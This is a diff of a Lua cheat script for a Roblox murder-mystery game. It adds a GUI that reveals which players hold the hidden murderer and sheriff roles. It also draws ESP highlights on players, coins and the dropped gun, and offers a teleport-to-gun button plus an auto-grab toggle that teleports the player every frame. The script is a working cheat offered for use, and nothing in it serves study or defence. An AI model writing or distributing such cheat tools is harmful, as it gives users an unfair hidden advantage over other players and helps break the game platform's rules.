+SheriffLabel.BackgroundTransparency = 1
+SheriffLabel.Text = "Sheriff: ?"
+SheriffLabel.TextColor3 = Color3.fromRGB(80, 150, 255)
+SheriffLabel.TextSize = 14
+SheriffLabel.Font = Enum.Font.GothamBold
+SheriffLabel.TextXAlignment = Enum.TextXAlignment.Left
+SheriffLabel.Parent = SheriffRow
+
+-- Gun Status Display
+local GunStatusFrame = Instance.new("Frame")
+GunStatusFrame.Size = UDim2.new(1, 0, 0, 34)
+GunStatusFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+GunStatusFrame.BorderSizePixel = 0
+GunStatusFrame.Parent = RolesTab
+Instance.new("UICorner", GunStatusFrame).CornerRadius = UDim.new(0, 4)
+
+local GunStatusLabel = Instance.new("TextLabel")
+GunStatusLabel.Size = UDim2.new(1, -20, 1, 0)
+GunStatusLabel.Position = UDim2.new(0, 10, 0, 0)
+GunStatusLabel.BackgroundTransparency = 1
+GunStatusLabel.Text = "Gun: Not Dropped"
+GunStatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+GunStatusLabel.TextSize = 12
+GunStatusLabel.Font = Enum.Font.GothamMedium
+GunStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+GunStatusLabel.Parent = GunStatusFrame
+
+local autoGrab = Section(RolesTab, "Auto Grab Gun")
+Toggle(autoGrab, Settings.AutoGrabGun, function(v)
+    Settings.AutoGrabGun = v
+end)
+
+local TpGunBtn = Button(RolesTab, "Teleport to Gun", function()
+    if DroppedGunPart then
+        if TeleportToGun() then
+            TpGunBtn.Text = "Teleported!"
+            task.wait(1)
+            TpGunBtn.Text = "Teleport to Gun"
+        end
+    end
+end)
+
+-- ============================================
+-- ESP TAB
+-- ============================================
+local murdererEsp = Section(ESPTab, "Murderer ESP")
+Toggle(murdererEsp, Settings.MurdererESP, function(v)
+    Settings.MurdererESP = v
+    RefreshAllESP()
+end)
+
+local sheriffEsp = Section(ESPTab, "Sheriff ESP")
+Toggle(sheriffEsp, Settings.SheriffESP, function(v)
+    Settings.SheriffESP = v
+    RefreshAllESP()
+end)
+
+local playerEsp = Section(ESPTab, "All Players ESP")
+Toggle(playerEsp, Settings.PlayerESP, function(v)
+    Settings.PlayerESP = v
+    RefreshAllESP()
+end)
+
+local coinEsp = Section(ESPTab, "Coin ESP")
+Toggle(coinEsp, Settings.CoinESP, function(v)
+    Settings.CoinESP = v
+    CreateCoinESP()
+end)
+
+local gunEsp = Section(ESPTab, "Gun ESP")
+Toggle(gunEsp, Settings.GunESP, function(v)
+    Settings.GunESP = v
+    CreateGunESP()
+end)
+
+-- ============================================
+-- SETTINGS TAB
+-- ============================================
+Keybind(SettingsTab, "Toggle Key", CONFIG.ToggleKey, function(v) CONFIG.ToggleKey = v end)
+
+-- ============================================
+-- DRAGGING & TOGGLE
+-- ============================================
+local dragging, dragStart, startPos
+Header.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging, dragStart, startPos = true, i.Position, Main.Position end end)
+Header.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
+UserInputService.InputChanged:Connect(function(i)
+    if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
+        local d = i.Position - dragStart
+        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+    end
+end)
+
+Close.MouseButton1Click:Connect(function()
+    GUIVisible = false
+    Tween(Main, {Size = UDim2.new(0, 340, 0, 0)}, 0.2)
+    task.delay(0.2, function() Main.Visible = false end)
+end)
+
+UserInputService.InputBegan:Connect(function(i, gp)
+    if gp then return end
+    if i.KeyCode == CONFIG.ToggleKey then
+        GUIVisible = not GUIVisible
+        if GUIVisible then
+            Main.Visible = true
+            Main.Size = UDim2.new(0, 340, 0, 0)
+            Tween(Main, {Size = UDim2.new(0, 340, 0, 380)}, 0.2)
+        else
+            Tween(Main, {Size = UDim2.new(0, 340, 0, 0)}, 0.2)
+            task.delay(0.2, function() Main.Visible = false end)
+        end
+    end
+end)
+
+-- ============================================
+-- PLAYER CONNECTIONS
+-- ============================================
+local function SetupPlayer(p)
+    if p == LocalPlayer then return end
+    p.CharacterAdded:Connect(function()
+        task.wait(0.5)
+        CreatePlayerESP(p)
+    end)
+    if p.Character then
+        CreatePlayerESP(p)
+    end
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+    SetupPlayer(p)
+end
+
+Players.PlayerAdded:Connect(SetupPlayer)
+Players.PlayerRemoving:Connect(RemovePlayerESP)
+
+LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(1)
+    RefreshAllESP()
+    CreateCoinESP()
+end)
+
+-- ============================================
+-- COIN SPAWN DETECTION - NIEUWE COINS
+-- ============================================
+Workspace.DescendantAdded:Connect(function(descendant)
+    if not Loaded then return end
+    if descendant.Name == "Coin_Server" and descendant:IsA("BasePart") then
+        task.wait(0.1)
+        AddCoinESP(descendant)
+    end
+end)
+
+-- ============================================
+-- UPDATE ROLE DISPLAY
+-- ============================================
+local function UpdateRoleUI()
+    if CurrentMurderer then
+        MurdererLabel.Text = "Murderer: " .. CurrentMurderer.Name
+        MurdererAvatar.Image = GetAvatarUrl(CurrentMurderer.UserId)
+    else
+        MurdererLabel.Text = "Murderer: ?"
+        MurdererAvatar.Image = ""
+    end
+    
+    if CurrentSheriff then
+        SheriffLabel.Text = "Sheriff: " .. CurrentSheriff.Name
+        SheriffAvatar.Image = GetAvatarUrl(CurrentSheriff.UserId)
+    else
+        SheriffLabel.Text = "Sheriff: ?"
+        SheriffAvatar.Image = ""
+    end
+    
+    if DroppedGunPart then
+        GunStatusLabel.Text = "Gun: DROPPED!"
+        GunStatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+        TpGunBtn.Text = "Teleport to Gun"
+    else
+        GunStatusLabel.Text = "Gun: Not Dropped"
+        GunStatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+        TpGunBtn.Text = "Gun Not Available"
+    end
+end
+
+-- ============================================
+-- MAIN LOOP
+-- ============================================
+task.spawn(function()
+    repeat task.wait() until Loaded
+    Main.Visible = true
+    Main.Size = UDim2.new(0, 340, 0, 0)
+    Tween(Main, {Size = UDim2.new(0, 340, 0, 380)}, 0.25)
+    
+    RefreshAllESP()
+    CreateCoinESP()
+end)
+
+RunService.RenderStepped:Connect(function()
+    if not Loaded then return end
+    
+    local rolesChanged = FindMurdererAndSheriff()
+    FindDroppedGun()
+    
+    if rolesChanged then
+        RefreshAllESP()
+    end
+    
+    UpdateRoleUI()
+    
+    if Settings.AutoGrabGun and DroppedGunPart then
+        TeleportToGun()
+    end
+    
+    if Settings.GunESP then
+        CreateGunESP()
+    end
+end)
+
+RunService.Heartbeat:Connect(function()
+    if not Loaded then return end
+    
+    for p, hl in pairs(ESPObjects) do
+        if not p or not p.Parent or not p.Character then
+            RemovePlayerESP(p)
+        end
+    end
+end)
